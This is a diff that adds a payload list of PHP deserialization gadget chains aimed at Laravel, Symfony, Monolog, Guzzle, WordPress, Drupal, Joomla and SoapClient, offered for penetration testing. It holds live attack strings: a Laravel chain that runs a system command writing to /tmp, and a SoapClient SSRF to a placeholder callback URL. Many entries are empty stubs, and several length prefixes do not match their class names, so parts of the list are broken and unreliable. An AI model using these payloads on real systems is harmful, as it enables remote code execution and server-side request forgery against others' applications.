@@ -1,0 +1,56 @@
+# Insecure Deserialization - PHP Gadget Chain Payloads
+# WARNING: These are for authorized penetration testing only
+# Replace {CALLBACK_URL} with your OOB callback URL
+
+# ====================================
+# Common PHP Framework Gadgets
+# ====================================
+
+# Laravel/Illuminate PendingBroadcast (file write)
+O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"\x00*\x00queueResolver";s:6:"system";}s:8:"\x00*\x00event";s:7:"id > /tmp/pwned";}
+
+# Symfony PropertyAccessor
+O:46:"Symfony\\Component\\PropertyAccess\\PropertyAccessor":0:{}
+
+# Monolog SyslogUdpHandler (RCE via socket)
+O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\\Handler\\BufferHandler":0:{};}
+
+# Guzzle FnStream
+O:24:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"\x00GuzzleHttp\\Psr7\\FnStream\x00methods";a:1:{s:5:"close";a:2:{i:0;r:1;i:1;s:4:"read";}}s:9:"_fn_close";s:7:"phpinfo";}
+
+# SwiftMailer (file write)
+O:36:"Swift\\Transport\\StreamBuffer":0:{}
+
+# Doctrine Annotations (file read)
+O:40:"Doctrine\\Annotations\\AnnotationRegistry":0:{}
+
+# ====================================
+# WordPress Specific
+# ====================================
+
+# WP POP Chain
+O:8:"WP_Theme":0:{}
+O:15:"WP_Block_Parser":0:{}
+
+# ====================================
+# Drupal Specific  
+# ====================================
+
+O:22:"Drupal\\Component\\Render\\FormattableMarkup":0:{}
+
+# ====================================
+# Joomla Specific
+# ====================================
+
+O:21:"JDatabaseDriverMysqli":0:{}
+O:15:"JSimplepieFactory":0:{}
+
+# ====================================
+# OOB Callback Gadgets
+# ====================================
+
+# SoapClient SSRF (replace {CALLBACK_URL})
+O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:100:"{CALLBACK_URL}";s:13:"_soap_version";i:1;}
+
+# Imagick (SSRF via external URL)
+O:7:"Imagick":0:{}
